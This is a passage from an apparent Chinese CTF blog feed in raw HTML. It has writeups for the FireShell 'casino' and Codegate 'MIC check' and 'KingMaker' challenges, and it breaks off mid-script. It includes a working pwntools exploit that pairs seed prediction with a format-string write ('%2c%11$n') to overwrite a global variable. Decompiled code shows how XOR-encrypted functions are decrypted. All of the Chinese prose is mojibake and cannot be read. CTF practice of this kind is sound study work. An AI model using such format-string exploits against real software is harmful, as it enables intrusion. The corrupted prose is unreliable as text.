class="string">"Cool! Here's another prize"</span>);</span><br><span class="line">    stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fread(&amp;ptr, <span class="number">0x1E</span>uLL, <span class="number">1u</span>LL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦çŒœ99æ¬¡éšæœºæ•°ï¼Œç„¶åä½¿å¾—ç”±<code>bet</code>ç´¯åŠ èµ·æ¥å¤§äº100å³å¾—åˆ°flagã€‚é¦–å…ˆè¦è¿‡å‰é¢çš„çŒœæ•°å­—ï¼Œç…§æ ·å­å†™ä¸€ä¸ªcç¨‹åºå³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> seed = time(<span class="number">0</span>) / <span class="number">0xA</span>;</span><br><span class="line"><span class="keyword">int</span> bet = <span class="number">2</span>; <span class="comment">// 1;</span></span><br><span class="line">    seed += bet;</span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">99</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> a = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆç¼–è¯‘ï¼Œ<code>gcc solve.c -o solve</code>ï¼›å†pipeä¸€ä¸‹ï¼Œ<code>(echo &#39;test&#39;; ./solve) | ./casino</code>ã€‚å¾—åˆ°ç»“æœæ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[1/100] Guess my number: Correct!</span><br><span class="line">...</span><br><span class="line">[99/100] Guess my number: Correct!</span><br></pre></td></tr></table></figure><p>è¯´æ˜çŒœæ•°å­—è¿‡äº†ï¼Œè€Œbetç´¯åŠ èµ·æ¥åªæœ‰99ï¼Œæ²¡æœ‰è¶…è¿‡100ã€‚æ­¤æ—¶å›å¿†ä¹‹å‰çš„ä»£ç ï¼Œ<code>printf(&quot;Welcome &quot;, &amp;buf);</code>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡è¿™ä¸ªæ¼æ´ï¼Œå°†<code>bet</code>çš„å€¼æ”¹å†™å³å¯ã€‚é€šè¿‡gdbè°ƒè¯•å¾—åˆ°<code>bet</code>çš„åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400ac3 &lt;main+132&gt;:call   0x400840 &lt;printf@plt&gt;</span><br><span class="line">   0x400ac8 &lt;main+137&gt;:mov    edi,0xa</span><br><span class="line">   0x400acd &lt;main+142&gt;:call   0x4007f0 &lt;putchar@plt&gt;</span><br><span class="line">=&gt; 0x400ad2 &lt;main+147&gt;:mov    eax,DWORD PTR [rip+0x201548]        # 0x602020 &lt;bet&gt;</span><br><span class="line">   0x400ad8 &lt;main+153&gt;:add    DWORD PTR [rbp-0x50],eax</span><br><span class="line">   0x400adb &lt;main+156&gt;:mov    eax,DWORD PTR [rbp-0x50]</span><br><span class="line">   0x400ade &lt;main+159&gt;:mov    edi,eax</span><br><span class="line">   0x400ae0 &lt;main+161&gt;:call   0x400870 &lt;srand@plt&gt;</span><br></pre></td></tr></table></figure><p>ç¡®å®šç¬¬ä¸€ä¸ªå‚æ•°åœ¨æ ˆä¸Šçš„åç§»ä¸º11ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[casino] python -c 'print "%2c%11$n" + "\x20\x20\x60\x00\x00\x00\x00\x00"' &gt; input             20:06:05 </span><br><span class="line">[casino] gdb ./casino -q                                                                       20:06:11 </span><br><span class="line">Reading symbols from ./casino...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; b *main+137</span><br><span class="line">Breakpoint 1 at 0x400ac8</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; r &lt; input </span><br><span class="line">Starting program: /root/ctf/2019-FireShell/casino/casino &lt; input</span><br><span class="line">What is your name? Welcome  ?  `</span><br><span class="line">Breakpoint 1, 0x0000000000400ac8 in main ()</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; x/wx 0x602020</span><br><span class="line">0x602020 &lt;bet&gt;:0x00000002</span><br></pre></td></tr></table></figure><p>æˆ‘æŠŠbetçš„å€¼æ”¹ä¸º2ã€‚æœ€åçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./casino'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">bet_addr = <span class="number">0x0000000000602020</span></span><br><span class="line">bet = <span class="number">2</span></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">fmt = <span class="string">'%&#123;&#125;c%&#123;&#125;$n'</span></span><br><span class="line">payload = flat([fmt.format(str(bet), str(offset)), bet_addr])</span><br><span class="line">p.sendlineafter(<span class="string">'name?'</span>, payload)</span><br><span class="line">s = process(<span class="string">'./solve'</span>)</span><br><span class="line">nums = s.recvall().split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">p.sendlineafter(<span class="string">'number:'</span>, n)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://cute-0tter.hatenablog.com/entry/2019/01/28/153836" target="_blank" rel="noopener">https://cute-0tter.hatenablog.com/entry/2019/01/28/153836</a><br><a href="https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA</a><br><a href="https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug</a><br><a href="https://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.md" target="_blank" rel="noopener">https://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.md</a><br><a href="https://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md" target="_blank" rel="noopener">https://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ¯”èµ›æ²¡æ‰“ï¼Œå½“ä½œç»ƒä¹ ä»¥åŠçœ‹ç€å¤§ä½¬çš„writeupå¤ç°äº†ä¸€ä¸‹å‡ é“äºŒè¿›åˆ¶ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2019-Codegate-review</title>
    <link href="https://qianfei11.github.io/2019/01/28/2019-Codegate-review/"/>
    <id>https://qianfei11.github.io/2019/01/28/2019-Codegate-review/</id>
    <published>2019-01-28T01:41:35.000Z</published>
    <updated>2019-02-02T12:27:50.907Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰“äº†ä¸€æ¬¡CodegateçœŸæ»´å¤ªéš¾äº†ã€‚è·Ÿç€å›½å¤–å¤§ä½¬çš„writeupå¤ç°è¿˜æ˜¯å­¦åˆ°äº†ä¸€ç‚¹ä¸œè¥¿ã€‚</p><a id="more"></a><h1 id="MIC-check"><a href="#MIC-check" class="headerlink" title="MIC check"></a>MIC check</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9P&amp;;gFD,5.BOPCdBl7Q+@Vâ€™1dDK?qL</span><br></pre></td></tr></table></figure><p>æ‰¾ä¸ªåœ¨çº¿è§£base85çš„ç½‘ç«™å³å¯ã€‚</p><h1 id="KingMaker"><a href="#KingMaker" class="headerlink" title="KingMaker"></a>KingMaker</h1><p>è¿è¡Œelfå‘ç°æ˜¯ä¸€ä¸ªåœ¨ç»ˆç«¯ä¸Šçš„æ–‡å­—å†’é™©æ¸¸æˆï¼Œæ¯æ¬¡åšå‡ºé€‰æ‹©ç„¶åè¾“å…¥keyï¼Œè‹¥æ­£ç¡®åˆ™è¿›å…¥ä¸‹ä¸€ç¯èŠ‚ã€‚mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0x4096</span>uLL, <span class="number">7</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"  _  ___             __  __       _             "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" | |/ (_)_ __   __ _|  \\/  | __ _| | _____ _ __ "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" | ' /| | '_ \\ / _` | |\\/| |/ _` | |/ / _ \\ '__|"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" | . \\| | | | | (_| | |  | | (_| |   &lt;  __/ |   "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" |_|\\_\\_|_| |_|\\__, |_|  |_|\\__,_|_|\\_\\___|_|   "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"               |___/                            \n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"Once upon a time, there was a kingdom with 7 princes."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"One day the king thinks to decide the who will be the next king."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"So he made 5 tests for the princes."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"If you pass all the tests, you can be a king!\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"**********************KING MAKER START**********************\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"..."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"....."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"......."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"Who am I...??"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"1&gt; Ask to someone"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"2&gt; Look around"</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\x1B[H\x1B[J"</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_403636((__int64)<span class="string">"\x1B[H\x1B[J"</span>, (__int64)&amp;choice);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">      end_game(<span class="string">"SYSTEM : Choose wrong choice!"</span>, <span class="number">0L</span>L);</span><br><span class="line">    sub_403607((__int64)<span class="string">"\x1B[H\x1B[J"</span>, (__int64)&amp;choice);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>end_game()</code>ä¸­çœ‹åˆ°<code>cat flag</code>ã€‚åŒæ—¶å‘ç°åªè¦äº”ä¸ªå˜é‡åŒæ—¶ç­‰äº5å°±èƒ½å¾—åˆ°flagï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">end_game</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( brave != <span class="number">5</span> || wise != <span class="number">5</span> || kind != <span class="number">5</span> || decision != <span class="number">5</span> || sacrifice != <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      put_s(<span class="string">"King : But you couldn't make the points... You can't be a king."</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      put_s(<span class="string">"King : Congratuations to be a king!"</span>, a2);</span><br><span class="line">      system(<span class="string">"/bin/cat ./flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºå¾€ä¸‹èµ°ï¼Œçœ‹åˆ°<code>stage1()</code>è¦æ±‚è¾“å…¥<code>key</code>ã€‚ä¹‹åçœ‹æ€»å…±æœ‰äº”æ¬¡è¦æ±‚è¾“å…¥keyï¼Œä¸‹é¢åˆ—å‡ºç¬¬ä¸€æ¬¡çš„åæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">stage1</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> key1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  put_s(<span class="string">"You : Am I....??"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"Servant : The king calls the prince!"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"..."</span>, a2);</span><br><span class="line">  put_s(<span class="string">"....."</span>, a2);</span><br><span class="line">  put_s(<span class="string">".......\n"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : I'm too old to rule the kingdom."</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : So I will give you few tests and choose the next king."</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : The only one prince who passes all the tests can be the king.\n"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : If you want to participate at this test, Enter the key for test 1"</span>, a2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\x1B[H\x1B[J"</span>, &amp;key1);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(&amp;key1, <span class="number">1u</span>, <span class="number">5u</span>) )</span><br><span class="line">    end_game(<span class="string">"King : Wrong! Don't you want to be a king?"</span>, <span class="number">0L</span>L);</span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)num1[<span class="number">0</span>];</span><br><span class="line">  encrypt_func(&amp;loc_40341D, num1[<span class="number">0</span>], &amp;key1);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, __int64))loc_40341D)(&amp;key1, v2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å‘ç°å¦‚æœè¿‡äº†checkï¼Œå‡½æ•°<code>loc_40341D</code>è¿™é‡Œè¢«åŠ å¯†äº†ï¼Œåªæœ‰ä¸€å¤§å—å¥‡æ€ªçš„æ•°æ®å—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040341D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040341D</span><br><span class="line">.text:000000000040341D loc_40341D:                             ; CODE XREF: stage1+CDâ†“p</span><br><span class="line">.text:000000000040341D                                         ; DATA XREF: stage1+BCâ†“o</span><br><span class="line">.text:000000000040341D ; __unwind &#123;</span><br><span class="line">.text:000000000040341D                 cmp     [rdi], eax      ; Compare Two Operands</span><br><span class="line">.text:000000000040341F                 call    rsi             ; Indirect Call Near Procedure</span><br><span class="line">.text:0000000000403421                 and     al, 0CCh        ; Logical AND</span><br><span class="line">.text:0000000000403421 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000403423                 db 9Ah, 13h, 24h, 0C6h, 0Bh</span><br><span class="line">.text:0000000000403428                 dq 76674937FD0708DBh, 0B67E9476FF076C33h, 0A0B484333616848Ch</span><br><span class="line">.text:0000000000403428                 dq 9E4F2C697EF093CCh, 3615048C89B0BAC2h, 0CCF093CCA0A88433h</span><br><span class="line">.text:0000000000403428                 dq 89B0BAEE9E4F2C65h, 0A09C84333619AF8Ch, 0FF079876FB0793CCh</span><br><span class="line">.text:0000000000403428                 dq 76F76C734F00D3F5h, 89B0B8639E4F6C33h, 764FD43336763E8Ch</span><br><span class="line">.text:0000000000403428                 dq 0FDB093E097A76C33h, 0FD6B19328ECC9876h, 23C4243356737F36h</span><br><span class="line">.text:0000000000403428                 dq 760F5F3CC989E5DBh, 33C424CC899960DBh, 89B13ADBB1C624DBh</span><br><span class="line">.text:0000000000403428                 dq 8ECC9876FD7487CCh, 56748F36FD6B1931h, 0C989E5DB23C42433h</span><br><span class="line">.text:0000000000403428                 dq 899A8CDB760F5FCCh, 0B1C624DB33C424CCh, 0C84087CC89B076DBh</span><br><span class="line">.text:0000000000403428                 dq 3676CF8C764F6C33h, 3EDF93CCA02D8433h, 534B5F7B12B729B8h</span><br><span class="line">.text:0000000000403428                 dq 33A76947764F6C1Bh</span><br><span class="line">.text:0000000000403508                 db 0E0h, 93h, 0B0h, 0BFh, 0F0h</span><br><span class="line">.text:0000000000403508 ; &#125; // starts at 40341D</span><br></pre></td></tr></table></figure><p>è¿›å…¥<code>encrypt()</code>å‡½æ•°ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½çŸ¥é“å¯¹å‡½æ•°é€šè¿‡keyå¼‚æˆ–æ¥åŠ å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">encrypt</span><span class="params">(_BYTE *start_addr, <span class="keyword">int</span> end_addr, <span class="keyword">const</span> <span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *fp; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> len; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *addr; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = (<span class="keyword">char</span> *)key;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( addr = start_addr; ; ++addr )</span><br><span class="line">  &#123;</span><br><span class="line">    fp = &amp;start_addr[end_addr];</span><br><span class="line">    <span class="keyword">if</span> ( fp &lt;= addr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *addr ^= s[i];</span><br><span class="line">    i = (i + <span class="number">1</span>) % len;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå› ä¸ºæ¯ä¸ªå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¸€å¼€å§‹éƒ½ä¼šæœ‰<code>push rbp ; mov rbp, rsp ;</code>ï¼Œåå…­è¿›åˆ¶è¡¨ç¤ºä¹Ÿå°±æ˜¯0x554889e5ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    mov rbp, rsp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> hex(u32(asm(code)))</span><br><span class="line"><span class="comment"># 0xe5894855</span></span><br><span class="line"><span class="comment"># little endian</span></span><br><span class="line"><span class="comment"># 55        push rbp</span></span><br><span class="line"><span class="comment"># 4889e5    mov rbp, rsp</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”±æ­¤å¯ä»¥è§£å‡º<code>key1</code>å’Œ<code>key2</code>ï¼Œç„¶å<code>key3</code>ã€<code>key4</code>å’Œ<code>key5</code>æ ¹æ®ä¹‹å‰è§£å‡ºå‡½æ•°å¯ä»¥å¾—åˆ°ã€‚ä¸‹é¢ç»™å‡ºè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(func, length)</span>:</span></span><br><span class="line">    prologue = [<span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x7D</span>, <span class="number">0xE8</span>]</span><br><span class="line">    length = min(len(prologue), length)</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> 